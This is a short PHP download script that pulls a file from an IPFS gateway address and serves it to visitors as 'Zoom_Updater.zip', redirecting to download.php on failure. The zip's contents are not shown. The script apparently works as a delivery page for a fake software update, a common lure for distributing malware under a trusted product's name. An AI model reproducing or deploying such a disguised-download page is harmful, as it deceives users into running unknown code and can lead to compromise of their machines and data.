<?php
$source = 'https://fuchsia-quickest-kite-522.mypinata.cloud/ipfs/bafkreic4b5ktuwmz4mtzgimw3xnkzk4i4qzjo6z7f5mvg6viwpoz4sveqe';
$newName = 'Zoom_Updater.zip';

header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . $newName . '"');
header('Expires: 0');
header('Cache-Control: must-revalidate');
header('Pragma: public');

$fp = fopen($source, 'r');
if ($fp) {
    while (!feof($fp)) {
        echo fread($fp, 4096);
        flush();
    }
    fclose($fp);
    exit;
} else {
    header("Location: ./download.php");
    exit;
}
?>
